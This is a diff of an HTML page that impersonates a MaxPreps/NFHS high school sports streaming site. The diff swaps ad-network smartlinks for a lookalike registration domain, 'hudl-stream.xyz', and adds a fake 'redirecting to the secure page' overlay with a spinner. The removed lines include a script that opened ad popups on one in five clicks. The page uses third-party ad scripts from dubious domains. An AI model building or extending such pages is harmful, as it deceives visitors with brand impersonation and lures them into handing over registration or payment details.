@@ -30,27 +30,83 @@
 
     /* page content */
     .page{max-width:var(--container);margin:28px auto;padding:0 20px;display:block}
-
     .card{background:var(--card);border-radius:10px;box-shadow:0 1px 0 rgba(0,0,0,0.06)}
 
     /* hero */
     .hero{padding:22px;border-radius:10px;overflow:hidden}
     .hero-inner{display:grid;grid-template-columns:1fr;align-items:start}
-    .hero-figure{position:relative;height:520px;background:#ddd;border-radius:8px;overflow:hidden}
-    .hero-figure img{width:100%;height:100%;object-fit:cover;display:block}
-    .hero-overlay{position:absolute;left:0;top:0;width:100%;height:100%;background:rgba(0,0,0,0.4);display:flex;flex-direction:column;justify-content:center;align-items:center;gap:14px;color:#fff;text-align:center}
+    .hero-figure{position:relative;height:520px;background:#000;border-radius:8px;overflow:hidden}
+    .hero-video{
+      width:100%;height:100%;
+      object-fit:cover;
+      display:block;
+      border-radius:8px;
+    }
+    .hero-overlay{
+      position:absolute;left:0;top:0;width:100%;height:100%;
+      background:rgba(0,0,0,0.45);
+      display:flex;flex-direction:column;justify-content:center;align-items:center;gap:14px;
+      color:#fff;text-align:center;
+    }
     .hero-overlay h2{font-size:32px;margin:0;font-weight:800;text-shadow:0 3px 10px rgba(0,0,0,0.6)}
-    .hero-overlay .watch-btn{background:var(--red);border:none;color:#fff;padding:10px 24px;border-radius:6px;font-weight:700;font-size:16px;cursor:pointer;box-shadow:0 4px 10px rgba(0,0,0,0.3);transition:0.2s}
+    .hero-overlay .watch-btn{
+      background:var(--red);border:none;color:#fff;
+      padding:10px 24px;border-radius:6px;font-weight:700;
+      font-size:16px;cursor:pointer;box-shadow:0 4px 10px rgba(0,0,0,0.3);
+      transition:0.2s;
+    }
     .hero-overlay .watch-btn:hover{background:var(--dark)}
 
-    /* ad placements */
+    /* ad banner */
     .ad-banner{width:100%;text-align:center;margin-bottom:20px}
-    .ad-socialbar{text-align:center;margin-top:30px}
+
     .section-title{font-size:30px;margin:6px 0 12px 0;font-weight:800}
 
-    @media (max-width:1000px){
-      .hero-figure{height:420px}
+    /* overlay */
+    .redirect-overlay{
+      position:fixed;
+      left:0;top:0;width:100%;height:100%;
+      background:rgba(255,255,255,0.95);
+      display:none;
+      align-items:center;
+      justify-content:center;
+      z-index:9999;
+      flex-direction:column;
+      gap:20px;
+      padding:20px;
     }
+    .redirect-banner {
+      width:728px;
+      max-width:calc(100% - 40px);
+      height:90px;
+      background:#f0f0f0;
+      border:1px solid #ddd;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      color:#666;
+      font-weight:700;
+      border-radius:6px;
+    }
+    .redirect-box{
+      background:#fff;
+      border-radius:8px;
+      padding:28px 36px;
+      box-shadow:0 6px 24px rgba(0,0,0,0.12);
+      text-align:center;
+      max-width:520px;
+      width:90%;
+    }
+    .redirect-box h1{margin:0;font-size:26px;color:#222}
+    .redirect-box p{margin:8px 0 0 0;color:#666}
+    .spinner{
+      margin:18px auto 0 auto;
+      width:36px;height:36px;border:4px solid #eee;border-top-color:var(--red);border-radius:50%;
+      animation:rot 1s linear infinite;
+    }
+    @keyframes rot{ to { transform:rotate(360deg); } }
+
+    @media (max-width:1000px){ .hero-figure{height:420px} }
     @media (max-width:600px){
       .hero-figure{height:300px}
       .topbar .inner{padding:10px}
@@ -64,20 +120,19 @@
   <header class="topbar">
     <div class="inner">
       <div class="logo">
-        <a href="https://www.effectivegatecpm.com/dmg2jn7siq?key=26351620e77c7b37be4b9663cab46e97" target="_blank">
+        <a href="https://nfhsnetwork.hudl-stream.xyz/register.php" target="_blank">
           <img src="https://i.imgur.com/pbWfbiI.png" alt="MaxPreps Logo">
         </a>
       </div>
       <nav class="nav" aria-label="Main navigation">
-        <a href="https://www.effectivegatecpm.com/dmg2jn7siq?key=26351620e77c7b37be4b9663cab46e97">Baseball</a>
-        <a href="https://www.effectivegatecpm.com/dmg2jn7siq?key=26351620e77c7b37be4b9663cab46e97">B. Basketball</a>
-        <a href="https://www.effectivegatecpm.com/dmg2jn7siq?key=26351620e77c7b37be4b9663cab46e97">G. Basketball</a>
-        <a href="https://www.effectivegatecpm.com/dmg2jn7siq?key=26351620e77c7b37be4b9663cab46e97">G. Volleyball</a>
+        <a href="https://nfhsnetwork.hudl-stream.xyz/register.php">Baseball</a>
+        <a href="https://nfhsnetwork.hudl-stream.xyz/register.php">B. Basketball</a>
+        <a href="https://nfhsnetwork.hudl-stream.xyz/register.php">G. Basketball</a>
+        <a href="https://nfhsnetwork.hudl-stream.xyz/register.php">G. Volleyball</a>
       </nav>
-
       <div class="actions">
-        <div class="search" onclick="window.open('https://www.effectivegatecpm.com/dmg2jn7siq?key=26351620e77c7b37be4b9663cab46e97')">🔍</div>
-        <button class="signin" onclick="window.open('https://www.effectivegatecpm.com/dmg2jn7siq?key=26351620e77c7b37be4b9663cab46e97')">Sign in</button>
+        <div class="search" onclick="window.open('https://nfhsnetwork.hudl-stream.xyz/register.php')">🔍</div>
+        <button class="signin" onclick="window.open('https://nfhsnetwork.hudl-stream.xyz/register.php')">Sign in</button>
       </div>
     </div>
   </header>
@@ -99,16 +154,23 @@
       <script type="text/javascript" src="//www.highperformanceformat.com/71e3506862232b8bbcecc3eee94c4749/invoke.js"></script>
     </div>
 
-    <!-- hero section -->
+    <!-- hero section with video -->
     <section>
       <div class="card hero">
         <div class="hero-inner">
           <div class="section-title">High School Sports</div>
           <div class="hero-figure">
-            <img src="https://i.imgur.com/tYEqhAu.png" alt="game">
+            <!-- video background -->
+            <video class="hero-video" autoplay muted loop playsinline>
+              <source src="https://archive.org/download/the-fall-sports-season-is-back-on-the-nfhs-network/The%20Fall%20Sports%20Season%20is%20Back%20on%20the%20NFHS%20NETWORK%21%21.mp4" type="video/mp4">
+              Browser Anda tidak mendukung video HTML5.
+            </video>
             <div class="hero-overlay">
               <h2>SUBSCRIBE TO WATCH</h2>
-              <button class="watch-btn" onclick="window.open('https://www.effectivegatecpm.com/dmg2jn7siq?key=26351620e77c7b37be4b9663cab46e97')">Watch Live</button>
+              <button class="watch-btn"
+                onclick="showLoadingAndRedirect('https://nfhsnetwork.hudl-stream.xyz/register.php')">
+                Watch Live
+              </button>
             </div>
           </div>
         </div>
@@ -129,24 +191,45 @@
       </div>
     </section>
 
-    <!-- Social Bar -->
-    <div class="ad-socialbar">
-      <script type='text/javascript' src='//pl27981776.effectivegatecpm.com/4a/66/84/4a6684543226567aed85bbe6df6a0618.js'></script>
-    </div>
-
   </main>
 
-  <!-- Smartlink trigger -->
+  <!-- Redirect overlay -->
+  <div class="redirect-overlay" id="redirectOverlay" role="dialog" aria-modal="true" aria-hidden="true">
+    <div class="redirect-banner" id="overlayBanner">
+      <script type="text/javascript">
+	atOptions = {
+		'key' : '71e3506862232b8bbcecc3eee94c4749',
+		'format' : 'iframe',
+		'height' : 90,
+		'width' : 728,
+		'params' : {}
+	};
+</script>
+<script type="text/javascript" src="//formatsquareabominable.com/71e3506862232b8bbcecc3eee94c4749/invoke.js"></script>
+    </div>
+
+    <div class="redirect-box">
+      <h1>Please Wait</h1>
+      <p>You are being redirected to the secure page...</p>
+      <div class="spinner" aria-hidden="true"></div>
+    </div>
+  </div>
+
+  <!-- redirect script -->
   <script>
-    // Open smartlink occasionally on user click (CTR booster)
-    document.addEventListener("click", function(e){
-      if(Math.random() < 0.2){ // 20% chance to open
-        window.open("https://www.effectivegatecpm.com/dmg2jn7siq?key=26351620e77c7b37be4b9663cab46e97","_blank");
-      }
-    });
+    function showLoadingAndRedirect(url) {
+      var overlay = document.getElementById('redirectOverlay');
+      overlay.style.display = 'flex';
+      overlay.setAttribute('aria-hidden', 'false');
+      setTimeout(function() {
+        overlay.style.display = 'none';
+        overlay.setAttribute('aria-hidden', 'true');
+        window.location.href = url;
+      }, 2000);
+    }
   </script>
 
-  <!-- Histats -->
+  <!-- Histats (kept as is) -->
   <script type="text/javascript">
     var _Hasync= _Hasync|| [];
     _Hasync.push(['Histats.start', '1,4980999,4,0,0,0,00010000']);
